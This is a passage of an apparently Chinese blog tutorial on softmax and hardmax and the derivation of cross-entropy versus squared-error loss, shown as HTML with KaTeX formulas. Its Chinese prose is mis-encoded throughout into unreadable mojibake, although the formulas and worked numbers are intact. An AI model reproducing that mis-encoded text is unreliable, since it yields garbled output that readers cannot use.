<li>æŸäººæ¥ä¸‹æ¥æœ€æœ‰å¯èƒ½çœ‹å“ªéƒ¨ç”µå½±ï¼Ÿ</li>
</ul>
<h3 data-id="heading-1">0.1 softmaxå’Œhardmax</h3>
<p><code>softmax</code>æœ¬è´¨ä¸Šå°±æ˜¯å°†ä¸€ä¸ªåºåˆ—ï¼Œå˜æˆç›¸åº”çš„æ¦‚ç‡ï¼Œå¹¶æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li>æ‰€æœ‰æ¦‚ç‡å€¼éƒ½åœ¨ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">]</span></span></span></span></span> ä¹‹é—´ï¼›</li>
<li>æ‰€æœ‰å€¼åŠ èµ·æ¥æ˜¯ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ã€‚</li>
</ul>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><msub><mi>y</mi><mi>j</mi></msub><mo>^</mo></mover><mo>=</mo><mi>s</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><msub><mi>o</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mfrac><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup><mrow><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msup><mi>e</mi><msub><mi>o</mi><mi>i</mi></msub></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">\hat{y_j} = softmax(o_j) = \frac{e^{o_j}}{\sum_{i=1}^{n}e^{o_i}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"/><span class="mord mathnormal">so</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.3354em;vertical-align:-0.994em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3414em;"><span style="top:-2.3057em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5904em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.994em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>å‡è®¾æœ‰ä¸ªè¾“å…¥æ˜¯ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0.0</mn><mo separator="true">,</mo><mn>1.0</mn><mo separator="true">,</mo><mn>2.0</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0.0, 1.0, 2.0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0.0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1.0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">2.0</span><span class="mclose">]</span></span></span></span></span>ï¼Œé‚£ä¹ˆ<code>softmax</code>è®¡ç®—åå°±æ˜¯ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0.0900</mn><mo separator="true">,</mo><mn>0.2447</mn><mo separator="true">,</mo><mn>0.6652</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0.0900, 0.2447, 0.6652]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0.0900</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">0.2447</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">0.6652</span><span class="mclose">]</span></span></span></span></span>ï¼Œå‡è®¾è¾“å…¥å˜ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0.0</mn><mo separator="true">,</mo><mn>1.0</mn><mo separator="true">,</mo><mn>3.0</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0.0, 1.0, 3.0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0.0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1.0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">3.0</span><span class="mclose">]</span></span></span></span></span>ï¼Œè€Œ<code>softmax</code>è®¡ç®—åå°±å˜æˆäº† <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0.0420</mn><mo separator="true">,</mo><mn>0.1142</mn><mo separator="true">,</mo><mn>0.8438</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0.0420, 0.1142, 0.8438]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0.0420</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">0.1142</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">0.8438</span><span class="mclose">]</span></span></span></span></span>ã€‚å¯ä»¥çœ‹å‡ºï¼Œ<code>softmax</code>æœ¬è´¨ä¸Šæœ‰å¾ˆå¼ºçš„<strong>é©¬å¤ªæ•ˆåº”</strong>ï¼š<strong>å¼ºï¼ˆå¤§ï¼‰çš„æ›´å¼ºï¼ˆå¤§ï¼‰ï¼Œå¼±ï¼ˆå°ï¼‰çš„æ›´å¼±ï¼ˆå°ï¼‰</strong> ã€‚</p>
<p>è€Œ<code>hardmax</code>å°±æ›´æš´åŠ›äº†ï¼Œé’ˆå¯¹ä»¥ä¸Šä¸¤ç§è¾“å…¥ï¼Œè¾“å‡ºéƒ½æ˜¯ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0.0</mn><mo separator="true">,</mo><mn>0.0</mn><mo separator="true">,</mo><mn>1.0</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0.0, 0.0, 1.0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0.0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">0.0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1.0</span><span class="mclose">]</span></span></span></span></span>ï¼Œè¿™ä½¿å¾—å…¶å‡½æ•°æœ¬èº«çš„æ¢¯åº¦æ˜¯éå¸¸ç¨€ç–çš„ï¼Œåªæœ‰è¢«é€‰ä¸­çš„å˜é‡ä¸Šé¢æ‰æœ‰æ¢¯åº¦ï¼Œè¿™å¯¹äºä¸€äº›ä»»åŠ¡æ¥è¯´å‡ ä¹æ˜¯ä¸å¯æ¥å—çš„ã€‚</p>
<h2 data-id="heading-2">1. åŸºæœ¬æ¨å¯¼</h2>
<p>å‰é¢çš„å…·ä½“çš„æ¨å¯¼è¿‡ç¨‹æˆ‘å°±ä¸è¯¦è¿°äº†ï¼Œå¯ä»¥å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fzh.d2l.ai%2Fchapter_linear-networks%2Fsoftmax-regression.html" target="_blank" title="https://zh.d2l.ai/chapter_linear-networks/softmax-regression.html" ref="nofollow noopener noreferrer">3.4. softmaxå›å½’</a>ã€‚è¿™é‡Œæˆ‘è¯´ä¸€ä¸‹æˆ‘ä¸ªäººçš„ç–‘æƒ‘ï¼š</p>
<ol>
<li>ä¸ºå•¥ä½¿ç”¨äº¤å‰ç†µæŸå¤±è€Œä¸æ˜¯å¹³æ–¹è¯¯å·®ï¼Ÿ</li>
<li>ä¸ç®¡æ˜¯å‰é¢çš„çº¿æ€§å›å½’ï¼Œè¿˜æ˜¯ç°åœ¨çš„<code>softmax</code>å›å½’ï¼Œå…¶å®çœŸå®çš„æ±‚å¯¼è¿‡ç¨‹éƒ½æ˜¯æ±‚å¾—æŸå¤±å‡½æ•°é’ˆå¯¹äºå‚æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">w</mi></mrow><annotation encoding="application/x-tex">\mathbf{w}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4444em;"/><span class="mord mathbf" style="margin-right:0.01597em;">w</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span> çš„å¯¼æ•°ï¼Œä»è€Œæœç€æ¢¯åº¦ä¸‹é™çš„æ–¹å‘æŒªåŠ¨ï¼Œä¸ºä»€ä¹ˆä¹¦ä¸Šåªæ¨å¯¼äº† <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial o_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4224em;vertical-align:-0.5423em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal mtight">L</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span>ï¼Œè€Œçœç•¥äº† <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>w</mi><mi>j</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial w_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4224em;vertical-align:-0.5423em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.0269em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal mtight">L</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span>ï¼Ÿ</li>
</ol>
<h3 data-id="heading-3">1.1 äº¤å‰ç†µæŸå¤±</h3>
<p><strong>å‡è®¾æˆ‘ä»¬é€‰æ‹©å¹³æ–¹è¯¯å·®ä½œä¸º<code>softmax</code>çš„æŸå¤±å‡½æ•°</strong>ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mo stretchy="false">(</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo>âˆ’</mo><msub><mi>y</mi><mi>i</mi></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">L = \frac{1}{2}\sum_{i=1}^{m}(\hat{y_i} - y_i)^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mopen">(</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></div>
<p>é‚£ä¹ˆå…¶å¯¹æ¨¡å‹logitsè¾“å‡ºçš„å¯¼æ•°å¦‚ä¸‹ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac><mo>=</mo><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mrow></mfrac><mo>â‹…</mo><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial o_j} = \sum_{i=1}^{m}\frac{\partial L}{\partial \hat{y_i}} \cdot \frac{\partial \hat{y_i}}{\partial o_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.3435em;vertical-align:-0.9721em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal">L</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal">L</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:2.3435em;vertical-align:-0.9721em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" 